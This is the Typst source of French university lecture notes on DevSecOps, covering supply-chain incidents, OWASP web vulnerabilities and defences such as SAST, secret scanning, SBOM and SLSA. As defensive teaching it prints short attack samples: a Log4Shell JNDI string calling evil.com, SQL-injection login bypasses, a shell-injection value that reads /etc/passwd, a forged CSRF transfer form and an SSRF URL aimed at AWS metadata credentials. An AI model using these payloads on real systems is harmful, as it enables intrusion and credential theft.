// ============================================================
// Polycopié — Cours 6 : DevSecOps — Attaques & Contre-mesures
// Université de Rennes · IRISA / DiverSE
// Olivier Barais
// ============================================================

#set document(
  title: "Cours 6 — DevSecOps : Attaques & Contre-mesures",
  author: "Olivier Barais",
  date: datetime(year: 2026, month: 9, day: 1),
)

#set page(
  paper: "a4",
  margin: (top: 2.5cm, bottom: 2.5cm, left: 2.5cm, right: 2.5cm),
  header: context {
    if counter(page).get().first() > 1 [
      #set text(size: 8pt, fill: luma(130))
      #grid(columns: (1fr, 1fr),
        [DevSecOps — Cours 6 · Université de Rennes],
        align(right)[Olivier Barais]
      )
      #line(length: 100%, stroke: 0.5pt + luma(200))
    ]
  },
  footer: context [
    #set text(size: 8pt, fill: luma(130))
    #line(length: 100%, stroke: 0.5pt + luma(200))
    #v(2pt)
    #grid(columns: (1fr, 1fr),
      [IRISA / DiverSE · 2026],
      align(right)[Page #counter(page).display("1")]
    )
  ]
)

#set text(font: "New Computer Modern", size: 10.5pt, lang: "fr")
#set par(justify: true, leading: 0.65em, spacing: 1.2em)
#set heading(numbering: "1.1")

#show heading.where(level: 1): it => {
  v(1.5em)
  block(
    fill: rgb("#1e40af"),
    radius: 4pt,
    inset: (x: 10pt, y: 6pt),
    width: 100%,
    text(fill: white, size: 14pt, weight: "bold")[#it.body]
  )
  v(0.5em)
}

#show heading.where(level: 2): it => {
  v(0.8em)
  text(size: 12pt, weight: "bold", fill: rgb("#1d4ed8"))[#it.body]
  v(0.3em)
}

#show heading.where(level: 3): it => {
  v(0.5em)
  text(size: 11pt, weight: "bold", fill: rgb("#374151"))[#it.body]
  v(0.2em)
}

// Boîte d'alerte
#let alert(color: red, icon: "⚠", body) = block(
  fill: color.lighten(90%),
  stroke: 0.8pt + color,
  radius: 4pt,
  inset: 10pt,
  width: 100%,
)[
  #text(weight: "bold")[#icon  ] #body
]

// Boîte d'exemple
#let example(title, body) = block(
  fill: rgb("#f0f9ff"),
  stroke: (left: 3pt + rgb("#0ea5e9")),
  inset: (left: 12pt, right: 10pt, top: 8pt, bottom: 8pt),
  width: 100%,
)[
  #text(weight: "bold", fill: rgb("#0369a1"))[Exemple — #title] \
  #v(4pt)
  #body
]

// Boîte de définition
#let definition(term, body) = block(
  fill: rgb("#f5f3ff"),
  stroke: (left: 3pt + rgb("#7c3aed")),
  inset: (left: 12pt, right: 10pt, top: 8pt, bottom: 8pt),
  width: 100%,
)[
  #text(weight: "bold", fill: rgb("#6d28d9"))[Définition — #term] \
  #v(4pt)
  #body
]

// Boîte de retenir
#let keypoint(body) = block(
  fill: rgb("#fff7ed"),
  stroke: (left: 3pt + rgb("#ea580c")),
  inset: (left: 12pt, right: 10pt, top: 8pt, bottom: 8pt),
  width: 100%,
)[
  #text(weight: "bold", fill: rgb("#c2410c"))[À retenir] \
  #v(4pt)
  #body
]

// Style des blocs de code
#show raw.where(block: true): it => block(
  fill: rgb("#0f172a"),
  radius: 4pt,
  inset: 10pt,
  width: 100%,
)[#text(fill: rgb("#94a3b8"), size: 9pt, font: "New Computer Modern")[#it]]

// ============================================================
// PAGE DE TITRE
// ============================================================

#align(center)[
  #v(2cm)
  #block(
    fill: rgb("#1e3a8a"),
    radius: 8pt,
    inset: 20pt,
    width: 90%,
  )[
    #text(fill: white, size: 11pt)[DevSecOps — Université de Rennes · IRISA / DiverSE]
    #v(8pt)
    #text(fill: white, size: 20pt, weight: "bold")[Cours 6]
    #v(4pt)
    #text(fill: rgb("#93c5fd"), size: 15pt)[DevSecOps : Attaques & Contre-mesures]
    #v(4pt)
    #text(fill: rgb("#bfdbfe"), size: 11pt)[Culture · Supply Chain · Vulnérabilités Web · SAST · SBOM]
  ]
  #v(1.5cm)
  #text(size: 11pt)[Olivier Barais]
  #v(0.3em)
  #text(size: 10pt, fill: luma(80))[Université de Rennes · IRISA · Équipe DiverSE]
  #v(0.3em)
  #text(size: 10pt, fill: luma(80))[2026]
]

#pagebreak()

// ============================================================
// TABLE DES MATIÈRES
// ============================================================

#outline(title: "Table des matières", depth: 2, indent: 1.5em)

#pagebreak()

// ============================================================
// 1. DEVSECOPS — DÉFINITION ET CULTURE
// ============================================================

= DevSecOps — Définition et culture

== Du DevOps au DevSecOps

Le mouvement DevOps, formalisé à partir de 2009, vise à rapprocher les équipes de développement (_Dev_) et d'exploitation (_Ops_) pour accélérer la livraison de logiciels tout en améliorant la fiabilité. L'adoption de pratiques comme l'intégration continue (CI) et le déploiement continu (CD) a considérablement réduit les cycles de mise en production @kim2016devops.

Cependant, l'accélération des cycles de livraison a aussi amplifié la surface d'exposition aux risques de sécurité. Le concept de *DevSecOps* répond à ce défi en intégrant la sécurité (_Sec_) comme une responsabilité partagée, dès la conception, et non plus comme une phase de validation finale.

#definition("DevSecOps")[
  Le DevSecOps est une approche culturelle, organisationnelle et technique qui intègre les pratiques de sécurité à chaque étape du cycle de vie du développement logiciel (SDLC), en automatisant les contrôles de sécurité dans les pipelines CI/CD et en responsabilisant chaque membre de l'équipe vis-à-vis de la sécurité @myrbakken2017devsecops.
]

Le NIST a formalisé ces pratiques dans le _Secure Software Development Framework_ (SSDF, SP 800-218), qui décrit quatre grandes familles de pratiques : préparer l'organisation, protéger le logiciel, produire du logiciel bien sécurisé, et répondre aux vulnérabilités @nist800218.

== La boucle DevSecOps

La boucle DevSecOps est souvent représentée sous forme d'un symbole infini (∞) illustrant l'enchaînement continu des phases de développement et d'exploitation :

#block(
  fill: rgb("#f8fafc"),
  stroke: 0.5pt + luma(200),
  radius: 4pt,
  inset: 12pt,
  width: 100%,
)[
  #text(size: 9.5pt)[
    *Phase Dev* \
    - *Code* : pratiques de codage sécurisé, revues de code, threat modeling \
    - *Build* : analyse statique (SAST), audit des dépendances \
    - *Test* : tests de sécurité dynamiques (DAST), tests de pénétration automatisés \
    \
    *Phase Ops* \
    - *Deploy* : validation des artefacts (signature, SBOM), configuration sécurisée \
    - *Operate* : gestion des correctifs de sécurité, hardening des environnements \
    - *Monitor* : détection d'anomalies, audit des accès, alertes sur les CVE
  ]
]

#keypoint[
  DevSecOps ne signifie pas simplement ajouter des outils de sécurité dans le pipeline — c'est avant tout un *changement culturel* : chaque développeur est responsable de la sécurité de son code, et la sécurité doit être _aussi agile_ que le développement @rajapakse2022challenges.
]

== Le programme Security Champion

Implémenter une culture DevSecOps dans une grande organisation nécessite des relais humains. Le programme *Security Champion* désigne un développeur référent sécurité au sein de chaque équipe produit. Ce rôle ne requiert pas d'expertise de sécurité approfondie, mais implique :

- Participer aux réunions de l'équipe sécurité et relayer les priorités à son équipe ;
- Identifier les risques lors des discussions d'architecture et des revues de code ;
- Être le premier point de contact lors d'une question ou d'un incident de sécurité ;
- Promouvoir l'utilisation des outils SAST, DAST et d'audit des dépendances.

== Intégration dans l'outillage existant

L'un des principes fondateurs du DevSecOps est de *ne pas créer de friction* pour les développeurs. Les outils de sécurité doivent s'intégrer dans les environnements familiers : IDE, système de gestion de version (Git), plateforme CI/CD (GitHub Actions, GitLab CI, Jenkins).

#example("Pipeline de sécurité type")[
  Un pipeline CI/CD sécurisé peut enchaîner : détection de secrets dans les commits (Gitleaks) → analyse statique du code (Bandit, Semgrep) → audit des dépendances (pip-audit, npm audit) → scan de l'image Docker (Trivy) → génération du SBOM (Syft/cdxgen) → vérification SLSA.
]

// ============================================================
// 2. ATTAQUES SUR LA SUPPLY CHAIN
// ============================================================

= Attaques sur la Supply Chain logicielle

== Le contexte de l'open source

Le logiciel open source est omniprésent dans les systèmes d'information modernes. Selon le rapport _Open Source Security and Risk Analysis_ (Synopsis), plus de 96% des bases de code commerciales contiennent des composants open source, et 84% d'entre elles présentent au moins une vulnérabilité.

L'ENISA a identifié les attaques sur la _supply chain_ logicielle comme l'une des dix menaces cybersécurité les plus importantes pour la prochaine décennie, en projection jusqu'en 2030 @enisa2021supply. La CISA américaine a publié en 2022 un guide de bonnes pratiques pour sécuriser les chaînes d'approvisionnement logicielles @cisaopensource2023.

#alert(color: rgb("#dc2626"), icon: "🔴")[
  Un composant open source largement utilisé et mal maintenu peut devenir le maillon faible de milliers d'applications, comme l'ont illustré les incidents Log4Shell et XZ Utils.
]

== Vecteurs d'attaque

Ohm et al. ont proposé une taxonomie des attaques sur la supply chain logicielle @ohm2020backstabber, et la _Risk Explorer for Software Supply Chains_ de SAP a opérationnalisé ces vecteurs sous la forme du catalogue A1–A8 @sap2023riskexplorer :

#block(
  fill: rgb("#f8fafc"),
  stroke: 0.5pt + luma(200),
  radius: 4pt,
  inset: 12pt,
  width: 100%,
)[
  #table(
    columns: (auto, 1fr),
    stroke: none,
    fill: (_, row) => if calc.odd(row) { luma(248) } else { white },
    inset: 7pt,
    [*Vecteur*], [*Description*],
    [A1 — Compte compromis], [Prise de contrôle du compte d'un mainteneur (credential stuffing, phishing)],
    [A2 — Typosquatting], [Publication d'un paquet au nom similaire à un paquet populaire (`requsets`, `colourama`)],
    [A3 — Injection dans le source], [Contribution malveillante acceptée par un projet (XZ Utils)],
    [A4 — Build compromis], [Modification des outils ou scripts de compilation (SolarWinds)],
    [A5 — Registre compromis], [Injection dans le registre central (npm, PyPI) avant téléchargement],
    [A6 — Dépendance corrompue], [Modification post-publication d'un paquet déjà en production],
    [A7 — Canal de distribution], [Compromission du mécanisme de mise à jour automatique],
    [A8 — Image Docker], [Image de base contenant un malware dans les couches non vérifiées],
  )
]

== Incidents marquants

=== SolarWinds / SUNBURST (2020)

En décembre 2020, il a été découvert qu'une mise à jour de la plateforme de supervision SolarWinds Orion distribuée à environ 18 000 organisations (dont le Trésor américain, le Département d'État et des entreprises du Fortune 500) contenait une backdoor baptisée SUNBURST @solarwinds2021.

L'attaquant (attribué au groupe APT29, lié aux services de renseignement russes) avait compromis le _build system_ de SolarWinds en injectant du code malveillant lors de la phase de compilation, avant signature avec le certificat officiel. Le binaire final était donc cryptographiquement valide.

#keypoint[
  SolarWinds démontre qu'un code source propre ne suffit pas : le *système de build lui-même* peut être compromis. L'artefact distribué doit être traçable jusqu'à son origine via une chaîne de custody vérifiable (provenance SLSA).
]

=== Log4Shell (CVE-2021-44228, 2021)

La bibliothèque Apache Log4j2, présente dans une proportion considérable des applications Java en production, contenait une vulnérabilité permettant l'exécution de code arbitraire à distance (RCE) via une simple entrée utilisateur intégrant une expression JNDI @log4shell2021. La vulnérabilité a obtenu un score CVSS de 10,0/10 (critique maximum).

L'exploitabilité triviale — il suffisait d'envoyer `${jndi:ldap://evil.com/x}` dans n'importe quel champ loggé — combinée à la difficulté de détecter Log4j2 dans les dépendances transitives (personne ne savait l'utiliser), a provoqué une réponse d'urgence mondiale. Cet incident a mis en évidence l'absence quasi-totale de SBOM dans les organisations.

=== XZ Utils / liblzma (CVE-2024-3094, 2024)

L'attaque XZ Utils illustre une menace sophistiquée : l'infiltration patiente d'un projet open source @xzutils2024. Un acteur malveillant, opérant sous le pseudonyme « Jia Tan », a contribué légitimement au projet de compression `xz-utils` pendant deux ans, construisant progressivement sa réputation jusqu'à devenir co-mainteneur.

En mars 2024, il a introduit une backdoor dans les versions 5.6.0 et 5.6.1, ciblant exclusivement OpenSSH sur les systèmes x86-64 Linux avec systemd, permettant l'authentification sans mot de passe pour un attaquant disposant de la clé privée correspondante. La découverte — fortuite — est due à un ingénieur Microsoft qui avait remarqué une latence SSH anormale sur sa machine.

=== left-pad (2016)

En mars 2016, le développeur Azer Koçulu a retiré ses ~270 paquets npm suite à un conflit légal @azer2016leftpad. Parmi eux, le paquet `left-pad` — 11 lignes de code — dont la disparition a brisé des milliers de builds dans le monde, notamment ceux de React et Babel. Cet incident a mis en lumière deux risques distincts : la *granularité excessive* des dépendances (11 lignes de code en tant que dépendance externe) et la *disponibilité* non garantie des paquets open source.

// ============================================================
// 3. VULNÉRABILITÉS DES APPLICATIONS WEB
// ============================================================

= Vulnérabilités des applications Web

== OWASP Top 10

L'OWASP (_Open Web Application Security Project_) publie depuis 2003 une liste des dix risques les plus critiques pour les applications web @owasp2021top10. La version 2021 reflète l'évolution du paysage des menaces :

#block(
  fill: rgb("#f8fafc"),
  stroke: 0.5pt + luma(200),
  radius: 4pt,
  inset: 10pt,
  width: 100%,
)[
  #table(
    columns: (auto, 1fr, auto),
    stroke: none,
    fill: (_, row) => if calc.odd(row) { luma(248) } else { white },
    inset: 6pt,
    [*\#*], [*Catégorie*], [*Nouveauté 2021*],
    [A01], [Broken Access Control], [↑ monte à la 1re place],
    [A02], [Cryptographic Failures], [anciennement « Sensitive Data Exposure »],
    [A03], [Injection (SQL, Shell, XSS…)], [regroupement des injections],
    [A04], [Insecure Design], [*nouvelle catégorie* 2021],
    [A05], [Security Misconfiguration], [inclut XXE],
    [A06], [Vulnerable and Outdated Components], [anciennement A9],
    [A07], [Identification and Authentication Failures], [],
    [A08], [Software and Data Integrity Failures], [*nouvelle* — inclut SolarWinds],
    [A09], [Security Logging and Monitoring Failures], [],
    [A10], [Server-Side Request Forgery (SSRF)], [*nouvelle* — communauté],
  )
]

== Injection SQL (SQLi)

L'injection SQL est une attaque qui consiste à insérer ou « injecter » une requête SQL non prévue dans la requête applicative, via une entrée non validée @halfond2006classification. Elle figure parmi les vulnérabilités les plus documentées et les plus exploitées depuis les années 2000, et reste présente dans la catégorie A03 de l'OWASP.

=== Principe

Lorsqu'une application construit une requête SQL par concaténation de chaînes incluant des entrées utilisateur, un attaquant peut modifier la logique de la requête :

```sql
-- Application vulnérable :
query = "SELECT uid FROM Users WHERE name='" + username + "'"
           + " AND password='" + password + "'"

-- Avec username = "admin';--" et n'importe quel password :
SELECT uid FROM Users WHERE name='admin';
-- AND password='...' est commenté → contournement de l'authentification

-- Avec password = "' OR '1'='1" :
SELECT uid FROM Users WHERE name='admin' AND password='' OR '1'='1'
-- Toujours vrai → connexion sans mot de passe
```

=== Types d'injection SQL

L'injection SQL prend plusieurs formes selon la façon dont l'attaquant obtient les informations extraites : injection classique (résultat visible dans la réponse), injection aveugle (_blind_) basée sur des réponses booléennes ou des délais temporels (`SLEEP()`), et injection hors bande (_out-of-band_) via DNS ou HTTP.

=== Contremesures

La contre-mesure principale est l'utilisation de *requêtes préparées* (également appelées requêtes paramétrées), qui séparent structurellement le code SQL des données @andersonsecurity2020 :

```python
# ✅ Requête préparée — Python / sqlite3
cursor.execute("SELECT uid FROM users WHERE name=? AND pwd=?",
               (username, password))

# ✅ ORM (Django)
user = User.objects.filter(name=username, password=hash_pwd).first()
```

Les règles complémentaires incluent : validation et filtrage de toutes les entrées côté serveur, principe du moindre privilège sur le compte de base de données (pas de `DROP`, `CREATE` pour le compte applicatif), et activation du WAF (_Web Application Firewall_) comme défense en profondeur.

== Injection Shell

L'injection shell est analogue à l'injection SQL, mais cible le shell du système d'exploitation. Elle survient lorsqu'une application construit une commande shell en incorporant des entrées utilisateur non échappées @stuttard2011hacker.

```python
# ❌ Code vulnérable — Flask (Bandit le détecte avec règle B602)
import commands
path = request.args.get('path')
status, output = commands.getstatusoutput('ls ' + path)
# Avec path = "; cat /etc/passwd" → exécution de commandes arbitraires

# ✅ Correction — utiliser subprocess avec liste d'arguments
import subprocess
result = subprocess.run(['ls', path], capture_output=True, text=True)
```

L'injection shell est souvent accompagnée d'autres mauvaises pratiques détectées par SAST : utilisation d'algorithmes cryptographiques obsolètes (MD5, DES), clés codées en dur dans le source, stockage de fichiers temporaires dans des répertoires publics (`/tmp`).

== Cross-Site Scripting (XSS)

Le XSS est une vulnérabilité qui permet à un attaquant d'injecter du code JavaScript malveillant dans les pages web servies à d'autres utilisateurs @owasp2021top10. L'objectif est généralement de voler des cookies de session, rediriger les utilisateurs, ou effectuer des actions à leur insu.

=== Types de XSS

#block(
  fill: rgb("#f8fafc"),
  stroke: 0.5pt + luma(200),
  radius: 4pt,
  inset: 10pt,
  width: 100%,
)[
  #table(
    columns: (auto, 1fr, 1fr),
    stroke: none,
    fill: (_, row) => if calc.odd(row) { luma(248) } else { white },
    inset: 7pt,
    [*Type*], [*Mécanisme*], [*Persistance*],
    [Stored XSS], [Script stocké en base, servi à tous les visiteurs], [Oui — permanent],
    [Reflected XSS], [Script dans l'URL, exécuté immédiatement], [Non — par lien piégé],
    [DOM-based XSS], [Manipulation du DOM côté client via JS], [Variable],
  )
]

=== Contremesures

Les contremesures efficaces contre le XSS combinent : validation des entrées côté serveur, *échappement systématique* des sorties (htmlspecialchars en PHP, `{{ }}` en Django/Jinja2 qui échappent par défaut), _Content Security Policy_ (CSP) pour restreindre les scripts autorisés, et l'attribut `HttpOnly` sur les cookies pour les rendre inaccessibles à JavaScript.

```html
<!-- ❌ Vulnérable -->
<div>Bonjour, <?= $_GET['name'] ?></div>

<!-- ✅ Échappé -->
<div>Bonjour, <?= htmlspecialchars($_GET['name'], ENT_QUOTES) ?></div>
```

#alert(color: rgb("#0369a1"), icon: "ℹ")[
  Les frameworks modernes (React, Vue, Angular, Django) échappent les variables automatiquement dans les templates. Le risque XSS subsiste uniquement lorsqu'on utilise explicitement `innerHTML`, `dangerouslySetInnerHTML`, ou `v-html`.
]

== Cross-Site Request Forgery (CSRF)

Le CSRF exploite la confiance qu'un site accorde aux requêtes émises par un navigateur authentifié @barth2008csrf. L'attaquant incite une victime à visiter une page piégée qui envoie, à son insu, une requête vers un site sur lequel la victime est authentifiée.

```html
<!-- Page malveillante visitée par la victime -->
<form action="https://banque.fr/virement" method="POST" id="f">
  <input type="hidden" name="montant" value="10000">
  <input type="hidden" name="destinataire" value="attaquant">
</form>
<script>document.getElementById('f').submit();</script>
<!-- Le navigateur inclut automatiquement les cookies de session banque.fr -->
```

=== Contremesures

La protection principale est le *jeton CSRF* (_synchronizer token pattern_) : un token aléatoire unique par session inclus dans chaque formulaire et vérifié côté serveur. Les protections complémentaires incluent l'attribut `SameSite=Strict` ou `SameSite=Lax` sur les cookies (empêche leur envoi dans les requêtes cross-site), et la vérification des en-têtes `Origin` / `Referer`.

#keypoint[
  Depuis 2020, les navigateurs modernes appliquent `SameSite=Lax` par défaut sur les cookies sans attribut explicite, ce qui réduit considérablement la surface d'attaque CSRF. Mais il faut toujours définir explicitement `SameSite=Strict` pour les cookies de session.
]

== Server-Side Request Forgery (SSRF)

Le SSRF est une vulnérabilité qui permet à un attaquant de forcer le serveur applicatif à effectuer des requêtes HTTP vers des ressources arbitraires, internes ou externes @chen2020ssrf. Elle est entrée dans le Top 10 OWASP en 2021 (A10) en raison de sa prévalence dans les environnements cloud.

=== Principe

```python
# ❌ Application vulnérable — récupération d'URL non validée
url = request.args.get('url')
response = requests.get(url)   # L'attaquant contrôle l'URL cible

# Payload d'attaque : accès aux métadonnées AWS EC2
# url = http://169.254.169.254/latest/meta-data/iam/security-credentials/
# → retourne les clés IAM temporaires de l'instance
```

Les cibles typiques d'une attaque SSRF en environnement cloud sont les _metadata endpoints_ des providers (AWS : `169.254.169.254`, GCP, Azure), les services internes non exposés (Redis, Elasticsearch, bases de données), et les services intranet derrière un pare-feu.

=== Contremesures

Les contremesures contre le SSRF incluent : validation stricte des URLs par liste blanche de domaines/IP autorisés, blocage réseau des plages RFC1918 (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) et des métadonnées cloud depuis le code applicatif, utilisation d'un proxy sortant dédié avec liste blanche, et activation du _IMDSv2_ (Instance Metadata Service v2) sur AWS qui nécessite un token PUT préalable.

// ============================================================
// 4. CONTRE-MESURES ET AUTOMATISATION
// ============================================================

= Contre-mesures et automatisation

== Pinning des dépendances

Le _pinning_ consiste à verrouiller la version exacte (et idéalement le hash cryptographique) de chaque dépendance utilisée, éliminant ainsi le risque de mise à jour implicite vers une version compromise.

```json
// package-lock.json — npm
{
  "node_modules/express": {
    "version": "4.18.2",
    "resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
    "integrity": "sha512-5/PsL6iGOs..."  // SHA-512 — vérifié à l'installation
  }
}
```

Les lock files (`package-lock.json`, `poetry.lock`, `Cargo.lock`, `Gemfile.lock`) doivent être commités dans le dépôt et utilisés en CI via des commandes déterministes (`npm ci` plutôt que `npm install`).

== Analyse statique de sécurité (SAST)

Le SAST (_Static Application Security Testing_) analyse le code source ou les bytecodes sans exécuter l'application, à la recherche de patterns connus de vulnérabilités @chess2004static. Cette technique est complémentaire aux tests dynamiques (DAST) et permet une détection précoce (_shift left_).

=== Bandit — SAST pour Python

Bandit est un outil SAST open source développé par l'OpenStack Security Group, aujourd'hui maintenu par la Python Code Quality Authority (PyCQA) @bandit2015. Il analyse l'AST (_Abstract Syntax Tree_) du code Python et applique un ensemble de règles de sécurité prédéfinies.

```bash
# Installation et usage de base
pip install bandit
bandit -r src/                     # analyse récursive du répertoire src/
bandit -r src/ -l                  # seulement HIGH et MEDIUM
bandit app.py -f json -o report.json  # sortie JSON pour le CI

# Exemple de rapport Bandit
>> Issue: [B608:hardcoded_sql_expressions] Possible SQL injection
   Severity: Medium   Confidence: Medium   Location: app.py:34
>> Issue: [B303:use_of_md5] Use of insecure MD5 hash function
   Severity: Medium   Confidence: High     Location: app.py:8
>> Issue: [B602:subprocess_popen_with_shell_equals_true]
   Severity: High     Confidence: High     Location: app.py:21
```

Les règles les plus importantes de Bandit incluent B101 (utilisation d'`assert` à des fins de sécurité), B201 (Flask `debug=True` en production), B303/B304 (MD5, DES, RC4), B501/B502 (désactivation SSL/TLS), B602/B603 (`subprocess` avec `shell=True`), et B608 (injection SQL).

=== Gitleaks — Détection de secrets

Gitleaks analyse l'historique git complet pour détecter les secrets codés en dur : clés API, tokens OAuth, certificats, mots de passe @gitleaks. Il peut être configuré comme hook pre-commit pour prévenir les fuites avant le push.

```bash
gitleaks detect --source .             # analyse le dépôt courant
gitleaks detect --source . --log-opts="--all"  # historique complet
gitleaks protect --staged              # hook pre-commit
```

#alert(color: rgb("#dc2626"), icon: "⚠")[
  Un secret commité dans git reste dans l'historique même après suppression via `git rm`. Un `git rebase -i` ou `git filter-branch` peut nettoyer l'historique, mais le secret doit être considéré comme *compromis* et révoqué immédiatement.
]

== Pipeline CI/CD sécurisé

L'intégration des outils de sécurité dans le pipeline CI/CD est le cœur du DevSecOps. Voici un exemple de pipeline GitHub Actions intégrant les principales vérifications :

```yaml
name: Security Pipeline
on: [push, pull_request]

jobs:
  sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install bandit && bandit -r src/ -l

  secrets:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }   # historique complet pour Gitleaks
      - uses: gitleaks/gitleaks-action@v2

  dependencies:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install pip-audit && pip-audit -r requirements.txt

  container-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'mon-app:${{ github.sha }}'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'           # échec du build si CRITICAL/HIGH

  sbom:
    runs-on: ubuntu-latest
    steps:
      - uses: anchore/sbom-action@v0
        with:
          image: 'mon-app:${{ github.sha }}'
          format: cyclonedx-json
```

== SBOM — Software Bill of Materials

Un SBOM est l'inventaire formel de tous les composants logiciels d'un artefact : bibliothèques directes et transitives, versions, licences, hashes d'intégrité, et vulnérabilités connues @ntia2021sbom. La métaphore courante est celle de la « liste d'ingrédients » sur les produits alimentaires.

=== Le format CycloneDX

CycloneDX, maintenu par l'OWASP Foundation, est l'un des deux formats de SBOM standardisés (avec SPDX) @cyclonedx16. Sa version 1.6 supporte les SBOM d'applications, de conteneurs, de firmwares, de modèles ML et de matériel.

```json
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.6",
  "metadata": {
    "component": { "type": "application", "name": "mon-api", "version": "2.1.0" }
  },
  "components": [
    {
      "type": "library",
      "name": "requests",
      "version": "2.31.0",
      "purl": "pkg:pypi/requests@2.31.0",
      "licenses": [{ "license": { "id": "Apache-2.0" } }],
      "hashes": [{ "alg": "SHA-256", "content": "58cd2187..." }]
    }
  ]
}
```

=== Cas d'usage du SBOM

Le SBOM répond à plusieurs besoins opérationnels : réponse rapide aux incidents (identification en quelques minutes de tous les systèmes impactés par une CVE, comme Log4Shell), audit de licence (détection des composants GPL incompatibles avec une distribution propriétaire), et conformité réglementaire (exécutif américain EO 14028, directive NIS2 européenne).

== SLSA — Supply chain Levels for Software Artifacts

SLSA (prononcé « salsa ») est un cadre de niveaux de maturité de la sécurité de la supply chain, co-développé par Google et l'OpenSSF @slsa2023. Sur le _build track_, il définit trois niveaux d'exigences progressives (L1 à L3), précédés du niveau L0 qui représente l'absence de garantie :

#block(
  fill: rgb("#f8fafc"),
  stroke: 0.5pt + luma(200),
  radius: 4pt,
  inset: 10pt,
  width: 100%,
)[
  #table(
    columns: (auto, auto, 1fr),
    stroke: none,
    fill: (_, row) => if calc.odd(row) { luma(248) } else { white },
    inset: 7pt,
    [*Niveau*], [*Nom*], [*Exigences principales*],
    [L0], [Aucune garantie], [Aucune exigence — niveau zéro du track build],
    [L1], [Provenance documentée], [Build script versionné, provenance générée automatiquement],
    [L2], [Provenance hébergée], [Build sur service CI, provenance signée cryptographiquement],
    [L3], [Build durci], [Build sur infrastructure isolée et vérifiée, provenance non falsifiable],
  )
]

L'objectif de SLSA est de rendre la compromission du pipeline de build *détectable et traçable*. L'attaque SolarWinds, par exemple, n'aurait pas pu produire un artefact SLSA L2 sans invalider la provenance signée.

```yaml
# SLSA L2 avec GitHub Actions — génération de provenance
- uses: actions/attest-build-provenance@v1
  with:
    subject-name: ghcr.io/${{ github.repository }}
    subject-digest: ${{ steps.build.outputs.digest }}
# → génère une attestation signée par l'OIDC GitHub Actions
```

// ============================================================
// CONCLUSION
// ============================================================

= Conclusion

Le DevSecOps n'est pas un produit à acheter ni une case à cocher, c'est une évolution culturelle et organisationnelle qui s'inscrit dans la durée. Les points clés à retenir de ce cours sont les suivants.

La sécurité doit être intégrée *à gauche* (_shift left_) : plus une vulnérabilité est détectée tôt dans le cycle de développement, moins elle est coûteuse à corriger. Un bug détecté par un développeur dans son IDE coûte en moyenne 100 fois moins cher qu'un bug exploité en production.

Les attaques sur la supply chain exploitent la *confiance implicite* accordée aux outils de build, aux dépendances open source et aux mainteneurs de projets. SolarWinds, Log4Shell et XZ Utils illustrent trois vecteurs distincts de cette menace qui ne peut être traitée par les seuls outils de sécurité applicative.

Les vulnérabilités web classiques (SQLi, XSS, CSRF, SSRF) restent prévalentes non par méconnaissance, mais par absence de pratiques systématiques. Les frameworks modernes et les outils SAST permettent de les éliminer de façon quasi-automatique.

Enfin, le SBOM et les cadres comme SLSA apportent une réponse structurée au problème de la traçabilité des composants, permettant de répondre en minutes à la question « sommes-nous touchés par cette CVE ? » plutôt qu'en semaines.

#keypoint[
  *La règle des 1-10-100* : corriger une vulnérabilité coûte 1 heure pendant le développement, 10 heures lors des tests, 100 heures en production. Investir dans le DevSecOps, c'est investir dans la détection précoce.
]

#pagebreak()

#bibliography("refs.bib", title: "Références", style: "ieee")
